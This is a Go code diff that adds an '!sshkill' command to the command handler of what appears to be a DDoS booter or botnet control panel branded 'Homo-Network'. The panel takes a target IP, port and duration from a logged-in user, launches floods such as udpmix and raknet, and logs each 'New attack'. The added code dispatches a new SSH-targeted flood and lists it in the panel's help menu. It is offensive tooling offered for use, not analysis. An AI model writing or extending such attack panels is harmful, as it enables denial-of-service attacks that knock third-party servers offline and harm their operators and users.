@@ -102,6 +102,23 @@ func CommandManager(conn net.Conn) {
 
 		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "udpmix", cmd[1], cmd[2])
 
+	} else if strings.HasPrefix(string(line), "!sshkill") {
+		cmd := strings.Split(string(line), " ")
+		fmt.Println(cmd)
+
+		if len(cmd) < 3 {
+			CommandError("!sshkill <TARGET> <PORT> <DURATION>\n\r", "!sshkill 1.1.1.1 1093 60\r\n", conn)
+		}
+		if len(cmd) > 4 {
+			CommandError("!sshkill <TARGET> <PORT> <DURATION>\n\r", "!sshkill 1.1.1.1 1093 60\r\n", conn)
+		}
+
+		go server.Sshkill(cmd[1], cmd[3], cmd[2])
+		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "*")
+		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login))
+		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
+
+		go NewAttack(sencoding.Encode(s.Login+"|"+string(time.Now().Unix())), cmd[3], "sshkill", cmd[1], cmd[2])
 	} else if strings.HasPrefix(string(line), "!raknet") {
 		cmd := strings.Split(string(line), " ")
 		fmt.Println(cmd)
@@ -230,6 +247,7 @@ func CommandManager(conn net.Conn) {
 		conn.Write([]byte(color.HiWhiteString("!tcpmix: Tcp mix method\t\t\t| Type: L4\n\r")))
 		conn.Write([]byte(color.HiWhiteString("!handshake: Handshake method\t\t| Type: L4\n\r")))
 		conn.Write([]byte(color.HiWhiteString("!raknet: Raknet method\t\t\t| Type: L4\n\r")))
+		conn.Write([]byte(color.HiWhiteString("!sshkill: Ssh method\t\t\t| Type: L4\n\r")))
 
 		conn.Write([]byte("\n"))
 
